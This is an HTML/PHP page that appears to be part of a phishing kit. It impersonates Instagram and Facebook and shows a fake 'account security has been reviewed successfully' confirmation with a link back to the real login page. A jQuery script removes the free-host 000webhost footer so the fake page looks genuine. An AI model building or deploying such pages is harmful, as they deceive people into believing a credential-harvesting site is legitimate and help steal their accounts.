<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Reviewed</title>
    <style>
        *{font-family:arial;}body{margin: 0px;}.header{font-size:13px;color:white;background:linear-gradient(90deg,purple,red,darkorange);width:100%;height:45px;}.heading1{margin-left:15px;margin-top: 5px;position: absolute;font-weight: bold;}.heading2{margin-top:20px;position:absolute;margin-left:15px;}.get_btn{margin-top:10px;margin-left:85%;background:darkorange;border:1px solid white;color:white;}.lnk_btn{text-decoration: none;color:white;}
    </style>
</head>
<body>
<center>
<div class="header">
        <p class="heading1">Instagram</p>
        <p class="heading2">Find it for free on Google Play</p>
        <button class="get_btn"><a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en" class="lnk_btn">GET</a></button>
</div>
   <br><br><br>
   <img src="img/insta.png" width="210" height="80">
   <?php
    echo '<br><p style="font-size:25px;text-align:center;width:80%;font-family:corona;color:red;">Your account security has been reviewed successfully.Thanks for co-operating with us.</p><p style="font-size:40px;border:2px solid darkorange;width:55px;border-radius:400px;background:linear-gradient(190deg,red,darkorange);">✔</p><a href="https://www.instagram.com/accounts/login/?source=mobile_nav_menu" style="color:orange;">Go back to login</a>'; 
    ?>
    <br><br>
    <div style="background:whitesmoke;margin-top:100px;height:20%;font-size:13px;">
        <br>from<br><b>FACEBOOK</b>
    </div>
</center>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script>
        $(document).ready(function () {$('body').find('img[src$="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"]').parent().closest('a').closest('div').remove();}); 
    </script>
</body>
</html>